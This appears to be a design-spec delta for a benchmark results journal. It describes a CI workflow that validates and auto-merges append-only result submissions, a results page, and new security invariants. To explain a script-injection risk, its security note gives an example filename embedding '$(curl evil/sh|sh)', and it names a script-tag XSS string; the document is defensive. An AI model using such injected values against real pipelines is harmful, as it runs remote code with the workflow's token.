# Deltas — Community results journal

Changes against [ci/spec.md](../../specs/ci/spec.md) and
[site/spec.md](../../specs/site/spec.md). Entry spec unchanged.

---

## ADDED — `results-check` workflow (ci spec)

**Insert after "Manual refresh".**

### Results check (every PR touching `results/`)

`results-check.yml` runs `scripts/results_check.py` against the PR. Activates only
when the diff includes added files under `results/`.

**Path isolation gate (precondition for auto-merge):**

The classify job exposes three independent signals to the downstream jobs:

| Signal | Computed via | Used for |
|---|---|---|
| `added_results` (list) | `tj-actions/changed-files` with `files_yaml: results/*/*.json`, excluding `_*.json` | Validator input |
| `modified_or_deleted_any` | `git diff --diff-filter=MDRC` against the PR base | Append-only rejection (M/D/R/C anywhere under `results/`) |
| `non_results_any` | All-changed-files minus `results/**` ≠ ∅ | "Mixed PR" detection (falls back to human review) |

`modified_or_deleted_any` is computed via a direct git diff *because* the
naïve `tj-actions/changed-files files: results/**` form reports "no
modifications" whenever any file under the path is added, allowing an
add+modify PR to silently slip past append-only enforcement.

| PR diff | Action |
|---|---|
| Only adds files under `results/<cube>/*.json` | Run validator → auto-merge if all pass |
| Modifies, deletes, renames, or copies anything in `results/` | Reject (`reject-modify` job fires, comment posted, exit 1) |
| Adds results/ files AND touches paths outside results/ | Validator runs; falls back to standard human review (no auto-merge) |

**Per-file validation** (all must pass):

1. JSON-schema validate against `results-schema.json`. The validator runs
   `Draft7Validator.check_schema(schema)` at load-time to catch typos in
   the schema itself before the first PR runner discovers them.
2. `<cube>` segment of the path matches an existing `entries/<cube>.yaml`.
3. JSON `benchmark_name` equals `<cube>`.
4. JSON `benchmark_version` is a known version (matches current entry, or a
   previously-seen version in `results/<cube>/`).
5. `benchmark_subset.n_tasks` ≤ `entries/<cube>.task_count`.
6. `outcomes` sum (`n_success + n_failure + n_max_steps + n_system_error + n_missing`)
   equals `benchmark_subset.n_tasks` (mutually exclusive, exhaustive).
7. `results.avg_score` is within metric bounds (default 0–1; per-cube override
   via optional entry field in a later RFC).
8. `agent.git_commit` is a 40-char lowercase hex string.
9. File size ≤ 50 KB.
10. `evaluation_id` is globally unique within `results/<cube>/` **and** unique
    across the other files being added in the same PR (sibling-batch check —
    two adds with the same id in one PR both fail).
11. Filename equals the sanitized `{evaluation_id}.json`
    (`/` → `__`, charset enforced by schema).
12. Filename does NOT start with `_` (reserved for CI-bot bookkeeping).

On all-pass: apply `auto-merge` label → existing GitHub auto-merge merges the PR.
On any failure: post a comment listing the failing checks, do not label.

The runner has **no cloud credentials** and **does not import any benchmark
package** — validation is pure JSON schema + cross-reference + arithmetic.

**Security: env-var passthrough for PR-author paths.** The
`needs.classify.outputs.added_results` value flows into the run block via
`env: ADDED_FILES`, never via `${{ }}` substitution into the shell. The
substitution form is a known GHA script-injection sink: `${{ }}` is rendered
into the shell script *before* execution, so a filename like
`results/x/$(curl evil/sh|sh).json` would execute on the runner with the
workflow's `GITHUB_TOKEN`. The validator's filename regex would reject the
path eventually — but only after the shell already ran.

**Fork PRs** — `GITHUB_TOKEN` is read-only on `pull_request` from a fork in
public repos, so `gh pr merge --auto --squash` is a no-op there. Validation
still runs and posts a green summary; a maintainer completes the merge by
hand. Documented in README's "Submitting a result" section.

---

## ADDED — Results journal (ci spec)

**Insert after "Results check" section.**

### Journal layout

```
results/
└── <cube-id>/
    └── <evaluation_id>.json     # one experiment-level run
```

One file per submitted run. Schema and example: `results-schema.json` +
`design.md` in this change folder.

Append-only. Files are never modified after merge. Mistakes are corrected by
appending a *new* submission with the corrected fields and a `supersedes`
reference to the original `evaluation_id`.

---

## ADDED — Results page (site spec)

**Insert after "Per-benchmark page".**

### Results section per benchmark

Each per-cube page gains a "Reproducibility journal" section with a
prominent "not a leaderboard" callout (amber banner) and a Grid.js-backed
sortable table:

| ☐ | Date | Agent / Model | Subset (name + filter/custom + n_tasks) | Score | Outcomes (✓/✗/⏱/💥/–) | Details → |
|---|---|---|---|---|---|---|

- **Subset cell** is a compact 2-line layout: the `benchmark_subset.name` on
  top, and one of three on the bottom depending on the subset shape:
  - `<filter> · N tasks` when `filter` is set (named glob/expression),
  - `custom: N tasks` when `task_ids` is populated (hand-picked list),
  - `N tasks` for a full benchmark with neither field set.
  This makes the subset shape — full benchmark, named filter, or
  hand-picked list — readable at a glance, without opening the modal.
- **Outcomes cell** renders the five-count breakdown
  (`n_success/n_failure/n_max_steps/n_system_error/n_missing`) as small
  color-coded badges, so readers can distinguish "low score because hard"
  from "low score because the runner crashed on most tasks."
- **Details** opens an inline **Compare-N modal** (also reachable by ticking
  2-4 row checkboxes and clicking "Compare selected →"). The modal renders
  one column per selected run with rows grouped Identity / Benchmark /
  Agent / Provenance / Outcome, amber-highlights cells where values
  disagree, and pinned-inline-vs-collapsed layout for the
  `dependency_versions` cell (primary tier inline, secondary in a
  `<details>` block).

`Submitter` is the GitHub handle of the PR author, written to
`results/<cube>/_submissions.json` by `record-submitter.yml` at merge time
(see ADDED — `record-submitter` workflow below).

Embedded JSON in `<script type="application/json">` is escaped via
`_json_for_html_script` (`<` → `\\u003c`, `>` → `\\u003e`, `&` → `\\u0026`)
because a submission whose free-text fields contain `</script><script>…`
would otherwise XSS every visitor. The round-trip is invisible to the
browser-side `JSON.parse`.

V2 (out of scope here): score-over-time, model comparison, filters.

---

## MODIFIED — Invariants (ci spec)

**Append:**

7. `results/` accepts community PRs and auto-merges them iff `results-check`
   passes *and* the diff is strictly inside `results/` (additions only). This is
   the single narrow exception to invariant #6.
8. The results-check runner has no cloud credentials and imports no benchmark
   packages.
9. `results/` is append-only: existing files are never modified or deleted by
   automation. Schema/format migrations land via tooling that writes *new* files.
10. PR-author-controlled values (file paths, filenames, JSON content) never
    flow through `${{ }}` substitution into a `run:` block. Path lists flow
    via `env:` variables; embedded JSON in script tags is HTML-escaped at
    site-generation time.
11. `results/<cube>/_*.json` is reserved for CI-bot bookkeeping. Community
    submissions cannot use a leading-underscore filename — validator rejects
    them at the path-check stage, regardless of schema validity.
12. `results/<cube>/_submissions.json` is writable only by the CI bot via
    `record-submitter.yml` (path-restricted bypass, same mechanism as
    `OWNERS.yaml`).

**Reword invariant #6:**

> ~~Entries never auto-merge~~ → "Entry PRs never auto-merge — a maintainer reviews every
> PR. Results PRs auto-merge per invariant #7."

---

## MODIFIED — Pipeline overview (ci spec)

**Add to PR-opened branch:**

```
PR opened
 ├─ ownership-check
 ├─ quick-check
 └─ results-check     (only if PR adds files under results/)
                       └─ auto-merge (if path-isolated + all checks pass)
```

---

## MODIFIED — Workflow list (ci spec)

```
.github/workflows/{quick-check,slow-check,update-owners,generate-site,
                   periodic-health-check,manual-refresh,results-check,
                   record-submitter}.yml
```

---

## ADDED — `record-submitter` workflow (ci spec)

**Insert after "Results check" section.**

### Record submitter (post-merge bot)

`record-submitter.yml` triggers on `push` to `main` with path filter
`results/*/*.json`. For each newly-added (`--diff-filter=A`) result file
that isn't bookkeeping (`_*.json`), it looks up the PR author for the merge
commit via `gh api repos/.../commits/<sha>/pulls`, then appends
`{<evaluation_id>: {submitted_by, merged_at}}` to
`results/<cube>/_submissions.json`. Writes via `git pull --rebase origin main`
before push so two concurrent runs don't lose each other's commits.

Runs with `contents: write` scoped to `_submissions.json` via the existing
path-restricted bypass pattern.

---

## NOT CHANGED

- All existing CI workflows and their security boundaries.
- Entry schema, ownership semantics, `OWNERS.yaml` write rules.
- `stress-results/`, `nightly-results/` (CI-bot-only write paths).
- The static site's index and per-benchmark page layout outside the new Results
  section.
